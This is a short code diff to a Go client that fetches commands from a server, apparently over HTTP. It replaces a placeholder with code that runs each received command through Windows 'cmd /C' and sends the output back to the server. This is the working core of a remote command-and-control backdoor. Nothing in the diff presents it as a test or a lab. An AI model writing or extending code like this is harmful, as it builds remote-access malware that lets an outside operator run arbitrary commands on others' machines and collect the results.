@@ -6,6 +6,7 @@ import (
     "fmt"
     "io/ioutil"
     "net/http"
+    "os/exec"
     "sync"
     "time"
 )
@@ -55,15 +56,19 @@ func sendResult(result CommandResult) error {
 }
 
 func executeCommandAndSendResult(cmd Command) {
-    resultText := fmt.Sprintf("Executed command: %s", cmd.Cmd)
+    // Execute the received command
+    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
 
     result := CommandResult{
         ID:     cmd.ID,
         Result: resultText,
     }
 
-    err := sendResult(result)
-    if err != nil {
+    if err := sendResult(result); err != nil {
         fmt.Printf("Error sending result for command ID %s: %s\n", cmd.ID, err)
     } else {
         fmt.Printf("Result for command ID %s sent successfully\n", cmd.ID)
